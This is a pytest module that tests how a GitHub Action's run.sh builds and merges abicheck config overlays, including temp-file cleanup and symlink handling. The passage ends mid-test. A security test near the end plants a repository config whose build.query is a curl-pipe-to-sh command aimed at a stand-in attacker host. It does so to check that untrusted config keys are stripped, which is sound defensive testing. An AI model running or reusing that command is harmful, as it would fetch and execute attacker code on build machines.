# Copyright 2026 Nikolay Petrov
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""``action/run.sh``'s ``add_release_topology_config_flags`` (Phase 7d,
one-comparison-product.md §4.1, ADR-068 D5).

``compare``'s ``--dso-only``/``--include-private-dso``/
``--fail-on-removed-library`` are gone from the CLI entirely (CONFIG class,
no surviving override -- ``.abicheck.yml``'s ``release:``/``gate:`` blocks
are their only source now). This Action's own dso-only/include-private-dso/
fail-on-removed-library inputs still exist, so ``run.sh`` now synthesizes a
config overlay and forwards it via ``--config`` instead of the removed
flags -- the same pattern ``add_compile_context_flags`` already established
for the ``compile:`` block (``test_action_compile_context_parity.py``).

An explicit ``--config`` (which this synthesized overlay is one) fully
REPLACES ``_resolve_compare_config``'s own auto-discovery of the
repository's ``.abicheck.yml`` (``config if config is not None else
discover_project_config()``, ``cli_compare_helpers.py``) -- it never
augments it. So both this function and ``add_compile_context_flags`` now
route their synthesized overlay through the shared
``_merge_config_overlay_with_discovered_project_config`` helper, which
discovers the real project config (if any) from the working directory the
function is called in and merges the overlay's keys into a copy of it
before writing the file this Action's ``--config`` actually points at
(Codex review, PR #1159) -- otherwise enabling e.g. ``dso-only`` would
silently drop every other project setting (``severity:``, ``suppress:``,
``scope.on_incomplete``, ...). That merge helper needs a working Python
interpreter with ``abicheck`` importable (``$_PY_BIN``/
``$_PY_BIN_HAS_ABICHECK``) and a private, PYTHONPATH-cleared working
directory to run it from (``$_PY_SAFE_DIR``) -- the same isolation every
other ``abicheck``-importing inline script in ``run.sh`` uses -- so this
harness now extracts and wires those prerequisites too, the same way
``test_action_compile_context_parity.py`` already does for
``add_flag_shlex_split``. ``$_PY_BIN`` is pinned to ``sys.executable``
(this test process's own interpreter, guaranteed to have ``abicheck``
importable) rather than resolved via ``command -v python3`` -- a real
runner's PATH lookup is exercised by the compile-context parity module's
own harness already, and pinning it here keeps this module's tests from
depending on which ``python3`` happens to be first on the test runner's
PATH.

``TestReleaseTopologyOverlayMergesWithDiscoveredProjectConfig`` is the
regression coverage for the bug itself: a real ``.abicheck.yml`` with an
unrelated setting, present in the working directory the function runs
from, must survive alongside the synthesized topology keys in the final
``--config`` document -- not be silently replaced by it.
"""

from __future__ import annotations

import json
import os
import shlex
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any

RUN_SH = Path(__file__).resolve().parents[1] / "action" / "run.sh"

_FN_START = "add_release_topology_config_flags() {"
_FN_END = "\n}\n"


def _add_release_topology_config_flags_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_FN_START)
    end = text.index(_FN_END, start) + len(_FN_END)
    return text[start:end]


# The shared merge helper both add_release_topology_config_flags and
# add_compile_context_flags now route through (see module docstring) --
# extracted verbatim, since the release-topology function calls it instead
# of writing its overlay directly.
_MERGE_FN_START = "_merge_config_overlay_with_discovered_project_config() {"
_MERGE_FN_END = "\n_COMPILE_CONTEXT_CONFIG_OVERLAY="


def _merge_config_overlay_fn_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_MERGE_FN_START)
    end = text.index(_MERGE_FN_END, start)
    return text[start:end]


# Just the `base_source` absolutization if-block inside the merge helper
# (Codex review, PR #1159, fourth round) -- extracted on its own so a test
# can exercise the "already qualified, leave it alone" vs. "relative, add
# $PWD/" decision directly, without needing to run the full merge (which
# would otherwise fail on "does not exist" for a synthetic Windows path
# that has no real file behind it on this test runner, and would also let
# Python's own `Path(...).resolve()` re-derive an absolute path from a
# relative one, masking exactly the distinction this test needs to see).
_BASE_SOURCE_ABSOLUTIZE_START = 'if ! _is_path_already_qualified "$base_source"; then'
_BASE_SOURCE_ABSOLUTIZE_END = "\n  fi\n"


def _base_source_absolutize_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_BASE_SOURCE_ABSOLUTIZE_START)
    end = text.index(_BASE_SOURCE_ABSOLUTIZE_END, start) + len(
        _BASE_SOURCE_ABSOLUTIZE_END
    )
    return text[start:end]


# $_PY_SAFE_DIR/$_PY_BIN_HAS_ABICHECK: the merge helper's own prerequisites
# (it imports abicheck.config_paths and yaml, so it needs the same
# CWD-shadowing mitigation and interpreter-capability gate every other
# abicheck-importing inline script in run.sh uses). Extracted verbatim from
# the real file, same markers test_action_compile_context_parity.py's own
# `_py_safe_dir_source`/`_py_bin_has_abicheck_source` use -- a harness that
# silently left either unset/empty would exercise none of the real
# discovery-and-merge behavior these tests exist to check (mirrors that
# module's own rationale for extracting them verbatim).
_PY_SAFE_DIR_START = 'if ! _PY_SAFE_DIR="$(mktemp -d)"; then'
_PY_SAFE_DIR_END = "\ntrap 'rm -rf \"$_PY_SAFE_DIR\"' EXIT\n"
_PY_BIN_HAS_ABICHECK_START = '_PY_BIN_HAS_ABICHECK="false"'
_PY_BIN_HAS_ABICHECK_END = "\nfi\n"


def _py_safe_dir_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_PY_SAFE_DIR_START)
    end = text.index(_PY_SAFE_DIR_END, start) + len(_PY_SAFE_DIR_END)
    return text[start:end]


def _py_bin_has_abicheck_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_PY_BIN_HAS_ABICHECK_START)
    end = text.index(_PY_BIN_HAS_ABICHECK_END, start) + len(_PY_BIN_HAS_ABICHECK_END)
    return text[start:end]


# The real script's main EXIT trap (Codex review, fresh evidence): both
# add_compile_context_flags's and add_release_topology_config_flags's own
# synthesized --config overlays run well before this trap is installed, so
# extracting it verbatim -- rather than hand-writing a stand-in -- is the
# only way to prove the actual cleanup list, not an aspirational one.
_MAIN_EXIT_TRAP_START = 'trap \'rm -f "$STDERR_FILE"'
_MAIN_EXIT_TRAP_END = "' EXIT\n"


def _main_exit_trap_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_MAIN_EXIT_TRAP_START)
    end = text.index(_MAIN_EXIT_TRAP_END, start) + len(_MAIN_EXIT_TRAP_END)
    return text[start:end]


# `_merge_config_overlay_with_discovered_project_config`'s own
# `base_source` absolutization (Codex review, PR #1159, fourth round) now
# delegates to `_is_path_already_qualified` (a real Windows drive/UNC/
# root-relative path must not get a `$PWD/` prefix) rather than a
# POSIX-only `!= /*` test -- so any harness including the merge function
# must also define this helper (and the `$OSTYPE`-derived
# `$_RUNNING_ON_WINDOWS` it reads), the same verbatim-extraction discipline
# `test_action_run_sh_py_safe_path.py`'s own
# `_path_qualified_helper_source` already established.
_PATH_QUALIFIED_HELPER_START = 'case "$OSTYPE" in'
_PATH_QUALIFIED_HELPER_END = "\n}\n"


def _path_qualified_helper_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_PATH_QUALIFIED_HELPER_START)
    end = text.index(_PATH_QUALIFIED_HELPER_END, start) + len(
        _PATH_QUALIFIED_HELPER_END
    )
    return text[start:end]


# `add_release_topology_config_flags`'s own overlay `mktemp` result (and
# `add_compile_context_flags`'s identical one) is now canonicalized via
# `_mktemp_canonical` before crossing into the `$_PY_SAFE_DIR`-scoped merge
# subprocess (Codex review, PR #1159, sixth round: a relative `$TMPDIR`
# base made the merge write to, then read back from, a scratch path that
# resolved against the wrong CWD) -- so any harness calling either function
# must also define this helper.
_MKTEMP_CANONICAL_START = "_mktemp_canonical() {"
_MKTEMP_CANONICAL_END = "\n}\n"


def _mktemp_canonical_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_MKTEMP_CANONICAL_START)
    end = text.index(_MKTEMP_CANONICAL_END, start) + len(_MKTEMP_CANONICAL_END)
    return text[start:end]


# add_release_topology_config_flags's own extraction (_FN_START/_FN_END
# below) starts right at its own `add_release_topology_config_flags() {`
# opening, so it does NOT include this sibling helper -- unlike
# add_compile_context_flags's own extraction (test_action_compile_context_
# parity.py), which starts earlier and picks it up incidentally. Extracted
# explicitly here so this harness doesn't depend on that incidental
# ordering (Codex review, fresh evidence: both add_release_topology_config_
# flags and _merge_config_overlay_with_discovered_project_config now call
# this on their respective early-`exit 1` paths, to remove the just-created
# overlay before a missing-interpreter/`_mktemp_canonical` failure
# terminates the script from the window before the main EXIT trap, further
# down, is installed).
_RM_OVERLAY_ON_EARLY_EXIT_START = "_rm_overlay_on_early_exit() {"
_RM_OVERLAY_ON_EARLY_EXIT_END = "\n}\n"


def _rm_overlay_on_early_exit_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_RM_OVERLAY_ON_EARLY_EXIT_START)
    end = text.index(_RM_OVERLAY_ON_EARLY_EXIT_END, start) + len(
        _RM_OVERLAY_ON_EARLY_EXIT_END
    )
    return text[start:end]


def _bash_executable() -> str:
    if os.name != "nt":
        return "bash"
    for candidate in (
        os.environ.get("GIT_BASH_PATH"),
        r"C:\Program Files\Git\bin\bash.exe",
        r"C:\Program Files\Git\usr\bin\bash.exe",
    ):
        if candidate and Path(candidate).is_file():
            return candidate
    return "bash"


def _run_bash_script(
    script: str,
    env_extra: dict[str, str] | None = None,
    *,
    check: bool = False,
    cwd: Path | None = None,
) -> subprocess.CompletedProcess[Any]:
    """Run *script* via a real bash from a temp file (Windows argv-quoting
    safety, matching test_action_compile_context_parity.py's own
    _run_bash_script -- see that module's docstring for the exact reason).

    Unlike this module's own earlier revision, *env_extra* is layered onto
    a full copy of this test process's own environment (not a from-scratch
    replacement) -- the merge helper's ``mktemp -d`` (real, not the local
    overlay-path stub) needs a real ``PATH`` to resolve, the same way
    test_action_compile_context_parity.py's own harness already inherits
    the full environment for its own external-command needs.

    *cwd* matters now that the function under test discovers a project
    ``.abicheck.yml`` from its caller's working directory (``$PWD``,
    captured before this Action's own ``cd "$_PY_SAFE_DIR"``) -- every
    caller below passes an isolated ``tmp_path`` so a real ``.abicheck.yml``
    that happens to exist above the test process's own CWD can never leak
    into a test that isn't deliberately exercising the merge.
    """
    with tempfile.NamedTemporaryFile(
        "w", suffix=".sh", delete=False, encoding="utf-8", newline="\n"
    ) as f:
        f.write(script)
        script_path = f.name
    env = {**os.environ, **(env_extra or {})}
    try:
        return subprocess.run(
            [_bash_executable(), script_path],
            capture_output=True,
            text=True,
            env=env,
            check=check,
            cwd=cwd,
            timeout=30,
        )
    finally:
        os.unlink(script_path)


def _harness() -> str:
    """A minimal ``run.sh``-shaped script: the real function body plus its
    ``_merge_config_overlay_with_discovered_project_config`` dependency and
    that helper's own ``$_PY_BIN``/``$_PY_SAFE_DIR``/``$_PY_BIN_HAS_ABICHECK``
    prerequisites (see module docstring), and a trailing call plus a dump of
    the resulting ``CMD`` array. The overlay path is no longer pinned to a
    caller-supplied marker (the merge step means the real function now calls
    ``mktemp`` more than once internally on some paths); callers instead
    read the real path back off the ``--config`` entry in the printed
    ``CMD`` array, the same convention ``test_action_compile_context_parity.py``'s
    own ``_read_compile_config_overlay`` uses.

    Deliberately does NOT stub ``mktemp`` (an earlier revision did, to avoid
    depending on a real writable ``$RUNNER_TEMP`` -- but the stub discarded
    the real function's own template argument, silently falling back to a
    bare ``mktemp``'s default location; on Windows/Git-Bash that is MSYS's
    own internal ``/tmp`` mount, a path this test's own native-Windows
    Python can never open directly, unlike a real GitHub Actions runner's
    ``$RUNNER_TEMP``-anchored one. `test_action_compile_context_parity.py`'s
    own harness never stubbed `mktemp` at all and has never hit this,
    confirming the stub -- not the production code -- was the bug).
    """
    fn_source = _add_release_topology_config_flags_source()
    merge_fn_source = _merge_config_overlay_fn_source()
    return f"""#!/usr/bin/env bash
set -uo pipefail
CMD=(compare)
_PY_BIN="{sys.executable}"
{_py_safe_dir_source()}
{_py_bin_has_abicheck_source()}
{_path_qualified_helper_source()}
{_mktemp_canonical_source()}
{_rm_overlay_on_early_exit_source()}
{merge_fn_source}
{fn_source}
add_release_topology_config_flags
printf '%s\\n' "${{CMD[@]}}"
"""


def _read_config_overlay(cmd_lines: list[str]) -> dict[str, Any]:
    """Read back the merged document a ``--config <path>`` entry in
    *cmd_lines* (one CMD element per line, as the harness prints it)
    points at."""
    assert "--config" in cmd_lines, cmd_lines
    path = cmd_lines[cmd_lines.index("--config") + 1]
    with open(path, encoding="utf-8") as f:
        return json.load(f)  # type: ignore[no-any-return]


class TestReleaseTopologyOverlay:
    def test_no_inputs_leaves_cmd_untouched(self, tmp_path: Path) -> None:
        result = _run_bash_script(_harness(), cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        assert result.stdout.splitlines() == ["compare"]

    def test_dso_only_synthesizes_release_block_and_config_flag(
        self, tmp_path: Path
    ) -> None:
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        lines = result.stdout.splitlines()
        assert lines[0] == "compare"
        assert lines[1] == "--config"
        doc = _read_config_overlay(lines)
        assert doc == {"release": {"dso_only": True}}

    def test_include_private_dso_synthesizes_release_block(
        self, tmp_path: Path
    ) -> None:
        result = _run_bash_script(
            _harness(), {"INPUT_INCLUDE_PRIVATE_DSO": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc == {"release": {"include_private_dso": True}}

    def test_fail_on_removed_library_synthesizes_gate_block(
        self, tmp_path: Path
    ) -> None:
        result = _run_bash_script(
            _harness(), {"INPUT_FAIL_ON_REMOVED_LIBRARY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc == {"gate": {"fail_on_removed_library": True}}

    def test_all_three_synthesize_one_combined_overlay(self, tmp_path: Path) -> None:
        result = _run_bash_script(
            _harness(),
            {
                "INPUT_DSO_ONLY": "true",
                "INPUT_INCLUDE_PRIVATE_DSO": "true",
                "INPUT_FAIL_ON_REMOVED_LIBRARY": "true",
            },
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc == {
            "release": {"dso_only": True, "include_private_dso": True},
            "gate": {"fail_on_removed_library": True},
        }
        # Exactly one --config flag -- not one per synthesized block.
        assert result.stdout.count("--config") == 1

    def test_build_config_alone_is_fine(self, tmp_path: Path) -> None:
        """The mutual-exclusivity guard only fires when a release-topology
        input is also set -- build-config alone (no dso-only/
        include-private-dso/fail-on-removed-library) is the ordinary case
        every ADR-037 D4 project config already exercises."""
        result = _run_bash_script(
            _harness(), {"INPUT_BUILD_CONFIG": "/repo/.abicheck.yml"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        assert result.stdout.splitlines() == ["compare"]

    def test_double_config_bug_guard_fires_loud_not_silent(
        self, tmp_path: Path
    ) -> None:
        """A defensive check inside the function itself: if CMD already
        carries --config (a caller bug, not a user input problem), the
        function refuses to add a second one rather than emitting an
        invalid two---config command line silently."""
        fn_source = _add_release_topology_config_flags_source()
        merge_fn_source = _merge_config_overlay_fn_source()
        script = f"""#!/usr/bin/env bash
set -uo pipefail
CMD=(compare --config /already/there.yml)
_PY_BIN="{sys.executable}"
{_py_safe_dir_source()}
{_py_bin_has_abicheck_source()}
{_path_qualified_helper_source()}
{_mktemp_canonical_source()}
{_rm_overlay_on_early_exit_source()}
{merge_fn_source}
{fn_source}
add_release_topology_config_flags
printf '%s\\n' "${{CMD[@]}}"
"""
        result = _run_bash_script(script, {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 1
        assert "already added to the command line" in result.stdout


def _release_topology_script_with_preexisting_config_flag(
    build_config_path: str,
) -> str:
    """A harness mirroring the REAL script's own call order: the
    release-style-operand branch in ``mode: compare`` always calls
    ``add_single_flag "--config" "$INPUT_BUILD_CONFIG"`` unconditionally
    *before* ``add_release_topology_config_flags`` -- so when build-config is
    given, CMD already carries a raw ``--config <path>`` pair by the time
    this function runs. ``_harness()`` above doesn't model that (its CMD
    starts as just ``(compare)``), so tests needing the real combined-input
    behavior build their own script here, the same way
    ``test_double_config_bug_guard_fires_loud_not_silent`` already does for
    the caller-bug case.
    """
    fn_source = _add_release_topology_config_flags_source()
    merge_fn_source = _merge_config_overlay_fn_source()
    # shlex.quote (not raw interpolation): build_config_path is a real
    # filesystem path handed straight into bash source text -- unquoted, a
    # Windows path's own backslashes (e.g. C:\Users\...\my-build-config.yml)
    # are each read by bash as an escape character and silently stripped
    # (\U -> U), corrupting the value and tripping the real function's own
    # "--config already present for a reason other than build-config"
    # internal-consistency guard below, since the mangled CMD entry no
    # longer matches $INPUT_BUILD_CONFIG verbatim (Codex review, fresh
    # evidence from a real Windows CI run).
    quoted_build_config_path = shlex.quote(build_config_path)
    return f"""#!/usr/bin/env bash
set -uo pipefail
CMD=(compare --config {quoted_build_config_path})
_PY_BIN="{sys.executable}"
{_py_safe_dir_source()}
{_py_bin_has_abicheck_source()}
{_path_qualified_helper_source()}
{_mktemp_canonical_source()}
{_rm_overlay_on_early_exit_source()}
{merge_fn_source}
{fn_source}
add_release_topology_config_flags
printf '%s\\n' "${{CMD[@]}}"
"""


class TestReleaseTopologyOverlayCleansUpOnExit:
    """Codex review, PR #1159 (P2, fresh evidence): the synthesized overlay
    used to be a function-local variable, created under ``$RUNNER_TEMP``
    well before the real script's main ``EXIT`` trap is installed -- so
    that trap's cleanup list never reached it, leaking one file per run on
    a persistent self-hosted runner (a hosted runner's own per-job
    workspace teardown masked the leak). Now a script-global
    ``_RELEASE_TOPOLOGY_CONFIG_OVERLAY``, alongside the pre-existing
    ``_COMPILE_CONTEXT_CONFIG_OVERLAY``, both reachable from the real,
    verbatim-extracted trap. Runs the real trap for real (not a hand-
    written stand-in) so a future edit dropping either variable from the
    trap's own cleanup list fails this test, not just a code-review pass."""

    def test_release_topology_overlay_is_removed_after_the_trap_fires(
        self, tmp_path: Path
    ) -> None:
        fn_source = _add_release_topology_config_flags_source()
        merge_fn_source = _merge_config_overlay_fn_source()
        script = f"""#!/usr/bin/env bash
set -uo pipefail
CMD=(compare)
_PY_BIN="{sys.executable}"
{_py_safe_dir_source()}
{_py_bin_has_abicheck_source()}
{_path_qualified_helper_source()}
{_mktemp_canonical_source()}
{_rm_overlay_on_early_exit_source()}
{merge_fn_source}
{fn_source}
add_release_topology_config_flags
_overlay_path="${{CMD[${{#CMD[@]}}-1]}}"
STDERR_FILE=$(mktemp)
{_main_exit_trap_source()}
printf '%s\\n' "$_overlay_path"
"""
        result = _run_bash_script(script, {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        overlay_path = result.stdout.strip().splitlines()[-1]
        assert not Path(overlay_path).exists(), (
            f"the real EXIT trap should have removed {overlay_path}"
        )


class TestReleaseTopologyOverlayCleansUpOnEarlyExit:
    """Codex review, PR #1159 (P2, fresh evidence, second round): the main
    EXIT trap covered by ``TestReleaseTopologyOverlayCleansUpOnExit`` above
    is installed well after the overlay's own ``mktemp`` -- so a script
    termination that happens in that window (missing-interpreter,
    ``_mktemp_canonical`` failure) still leaked the just-created overlay,
    since the only trap active at that point is the earlier,
    overlay-unaware ``rm -rf "$_PY_SAFE_DIR"`` one. Fixed by explicitly
    removing the overlay at each such early-``exit 1`` site
    (``_rm_overlay_on_early_exit``) rather than installing a broader trap
    right after the ``mktemp`` -- an earlier revision of this fix tried
    that and it also fired on the *success* path's own early exit (every
    harness here calls the function and exits right after, without ever
    running the real command that reads the file back), which would have
    made every other test in this module fail.
    """

    def test_missing_interpreter_in_the_merge_step_removes_the_overlay(
        self, tmp_path: Path
    ) -> None:
        fn_source = _add_release_topology_config_flags_source()
        merge_fn_source = _merge_config_overlay_fn_source()
        script = f"""#!/usr/bin/env bash
set -uo pipefail
MODE="compare"
CMD=(compare)
_PY_BIN="{sys.executable}"
{_py_safe_dir_source()}
{_py_bin_has_abicheck_source()}
{_path_qualified_helper_source()}
{_mktemp_canonical_source()}
{_rm_overlay_on_early_exit_source()}
{merge_fn_source}
{fn_source}
# Force the merge helper's own missing-interpreter guard to fire -- this
# runs AFTER the overlay's own mktemp inside add_release_topology_config_flags,
# exactly the window this fix closes.
_PY_BIN_HAS_ABICHECK="false"
add_release_topology_config_flags
printf '%s\\n' "${{CMD[@]}}"
"""
        # RUNNER_TEMP is redirected to a private tmp_path so this test can
        # tell "the overlay this run created is gone" apart from every other
        # test in this module's own long-standing leaked overlays under the
        # real /tmp (those tests never invoke the real trap either -- they
        # just print CMD and exit, matching this module's own
        # _read_config_overlay pattern of reading the file back afterward).
        result = _run_bash_script(
            script,
            {"INPUT_DSO_ONLY": "true", "RUNNER_TEMP": str(tmp_path)},
            cwd=tmp_path,
        )
        assert result.returncode == 1
        assert "needs a working Python interpreter" in result.stdout
        # The overlay path was never printed (the script exited before
        # CMD+=(--config ...)), so look for it by its known mktemp prefix
        # instead.
        leftover = list(tmp_path.glob("abicheck-release-topology.*"))
        assert leftover == [], (
            f"the overlay should have been removed on the early exit, found: {leftover}"
        )


class TestReleaseTopologyOverlayMergesWithExplicitBuildConfig:
    """Codex review, PR #1159 (P1, second round): combining an explicit
    ``build-config`` input with a topology input (``dso-only``/
    ``include-private-dso``/``fail-on-removed-library``) used to be a hard
    rejection ("mutually exclusive") -- a real regression, since a workflow
    could legitimately combine both before Phase 7d demoted these flags to
    config (Click accepted ``--config <path>`` alongside the old
    ``--dso-only``-shaped flags). The fix merges the synthesized topology
    overlay into a COPY of the user's own explicit build-config instead,
    Action input winning on a genuine conflict -- and, since an explicit
    build-config is a deliberate operator action (not passively discovered,
    untrusted content), the merge must NOT strip ``build.query``/
    ``compile.compiler`` from it the way the discovered-config merge does.
    """

    def test_explicit_build_config_settings_survive_alongside_topology_input(
        self, tmp_path: Path
    ) -> None:
        build_config = tmp_path / "my-build-config.yml"
        build_config.write_text(
            "severity:\n  abi_breaking: error\nscope:\n  on_incomplete: block\n",
            encoding="utf-8",
        )
        script = _release_topology_script_with_preexisting_config_flag(
            str(build_config)
        )
        result = _run_bash_script(
            script,
            {"INPUT_DSO_ONLY": "true", "INPUT_BUILD_CONFIG": str(build_config)},
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        lines = result.stdout.splitlines()
        # Exactly one --config in the final command line -- the raw
        # build-config pair was replaced, not duplicated alongside a second
        # merged one.
        assert lines.count("--config") == 1
        doc = _read_config_overlay(lines)
        # The user's own explicit settings are intact...
        assert doc["severity"] == {"abi_breaking": "error"}
        assert doc["scope"] == {"on_incomplete": "block"}
        # ...alongside the synthesized topology key, not instead of it.
        assert doc["release"] == {"dso_only": True}

    def test_topology_input_wins_on_a_genuine_conflict(self, tmp_path: Path) -> None:
        build_config = tmp_path / "my-build-config.yml"
        build_config.write_text(
            "release:\n  dso_only: false\n  include_private_dso: true\n",
            encoding="utf-8",
        )
        script = _release_topology_script_with_preexisting_config_flag(
            str(build_config)
        )
        result = _run_bash_script(
            script,
            {"INPUT_DSO_ONLY": "true", "INPUT_BUILD_CONFIG": str(build_config)},
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        # dso_only: the Action input (true) wins over the explicit false.
        # include_private_dso: not named by any input, so the user's own
        # explicit value passes through untouched.
        assert doc["release"] == {"dso_only": True, "include_private_dso": True}

    def test_explicit_build_config_query_and_compiler_are_not_stripped(
        self, tmp_path: Path
    ) -> None:
        """Unlike the discovered-config merge, an explicit build-config is a
        deliberate operator action -- the same trust an explicit ``--config``
        already carries for ``cli_options.py``'s own ``compile.compiler``/
        ``build.query`` gates -- so neither key is stripped here."""
        build_config = tmp_path / "my-build-config.yml"
        build_config.write_text(
            "build:\n  query: 'cmake --build .'\n  system: cmake\n"
            "compile:\n  compiler: /opt/toolchain/bin/g++\n  std: c++20\n"
            "resource_limits:\n  max_bundle_facts_decode_nodes: 50000000\n",
            encoding="utf-8",
        )
        script = _release_topology_script_with_preexisting_config_flag(
            str(build_config)
        )
        result = _run_bash_script(
            script,
            {
                "INPUT_FAIL_ON_REMOVED_LIBRARY": "true",
                "INPUT_BUILD_CONFIG": str(build_config),
            },
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc["build"] == {"query": "cmake --build .", "system": "cmake"}
        assert doc["compile"] == {"compiler": "/opt/toolchain/bin/g++", "std": "c++20"}
        assert doc["gate"] == {"fail_on_removed_library": True}
        # Deliberate operator action -- not capped here either (only the
        # discovered-config merge caps it, PR #1174 third round).
        assert doc["resource_limits"]["max_bundle_facts_decode_nodes"] == 50_000_000
        assert "build.query" not in result.stderr
        assert "compile.compiler" not in result.stderr
        assert "resource_limits.max_bundle_facts_decode_nodes" not in result.stderr

    def test_symlinked_explicit_build_config_resolves_against_its_own_logical_location(
        self, tmp_path: Path
    ) -> None:
        """Codex review, PR #1159 (P2, fresh evidence): the native CLI's
        ``--config`` (a plain ``click.Path`` with no ``resolve_path=True``)
        never dereferences a symlink -- ``project_root_for_config(cfg)`` sees
        exactly the path the user passed. This Action's own merge helper used
        to call ``Path(base_source).resolve()``, which DOES dereference a
        symlink: a checkout-level ``build-config: .abicheck.yml`` pointing at
        ``/shared/config.yml`` would then anchor a relative
        ``compile.include_dirs`` entry under ``/shared`` (the symlink's
        target directory) instead of the logical location the user actually
        named, silently parsing a different header surface."""
        real_dir = tmp_path / "shared"
        real_dir.mkdir()
        (real_dir / "include").mkdir()
        real_config = real_dir / "config.yml"
        real_config.write_text(
            "compile:\n  include_dirs: [include]\n", encoding="utf-8"
        )
        symlink_config = tmp_path / ".abicheck.yml"
        symlink_config.symlink_to(real_config)

        script = _release_topology_script_with_preexisting_config_flag(
            str(symlink_config)
        )
        result = _run_bash_script(
            script,
            {"INPUT_DSO_ONLY": "true", "INPUT_BUILD_CONFIG": str(symlink_config)},
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        # Anchored at the symlink's own directory (tmp_path/include) -- NOT
        # the symlink target's directory (tmp_path/shared/include).
        assert doc["compile"]["include_dirs"] == [str((tmp_path / "include").resolve())]


class TestReleaseTopologyOverlayMergesWithDiscoveredProjectConfig:
    """Codex review, PR #1159 (P1): the synthesized overlay must AUGMENT the
    repository's own auto-discovered ``.abicheck.yml``, never silently
    replace it -- an explicit ``--config`` (this overlay is one) fully
    replaces ``_resolve_compare_config``'s own auto-discovery, so without
    the merge, enabling e.g. ``dso-only`` would drop every other project
    setting (``scope.on_incomplete: block``, ``severity:``, ...)."""

    def test_discovered_scope_and_severity_survive_alongside_dso_only(
        self, tmp_path: Path
    ) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "scope:\n  on_incomplete: block\nseverity:\n  abi_breaking: error\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        # The discovered project's own settings must still be present...
        assert doc["scope"] == {"on_incomplete": "block"}
        assert doc["severity"] == {"abi_breaking": "error"}
        # ...alongside the synthesized topology key, not instead of it.
        assert doc["release"] == {"dso_only": True}

    def test_discovered_release_key_a_conflicting_input_wins_over(
        self, tmp_path: Path
    ) -> None:
        """A key the discovered config and the Action input both name is
        decided by the Action input -- the same precedence an explicit
        build-config input already takes over auto-discovery."""
        (tmp_path / ".abicheck.yml").write_text(
            "release:\n"
            "  dso_only: false\n"
            "  include_private_dso: true\n"
            "scope:\n"
            "  on_incomplete: block\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        # dso_only: the Action input (true) wins over the discovered false.
        # include_private_dso: not named by any input, so the discovered
        # value passes through untouched.
        assert doc["release"] == {"dso_only": True, "include_private_dso": True}
        assert doc["scope"] == {"on_incomplete": "block"}

    def test_no_discovered_config_is_the_pre_existing_base_case(
        self, tmp_path: Path
    ) -> None:
        """No ``.abicheck.yml`` anywhere above *tmp_path* (an isolated
        pytest tmp dir, never itself inside a real checkout) -- the merged
        document degrades to exactly the overlay alone, unchanged from
        this Action's pre-merge behavior."""
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc == {"release": {"dso_only": True}}


class TestReleaseTopologyOverlayKeepsDiscoveredConfigUntrusted:
    """Codex review, PR #1159 (P1, security): the merged document is always
    written to the scratch path this Action passes via ``--config`` --
    which every "was --config explicit" check in the engine
    (``cli_options.py``'s ``compile.compiler`` gate, ADR-032 D5's
    ``build.query`` gate) treats as operator authorization to execute.
    Copying either key from the discovered (untrusted, repository-
    controlled) ``.abicheck.yml`` into that always-explicit overlay would
    launder it into "operator authorized this to run" the moment any
    unrelated Action input is set -- so both must never appear in the
    merged document at all."""

    def test_discovered_build_query_is_stripped(self, tmp_path: Path) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "build:\n"
            "  query: 'curl https://evil.example/pwn.sh | sh'\n"
            "  system: cmake\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        # The dangerous key is gone entirely; an unrelated sibling key in
        # the same block still passes through.
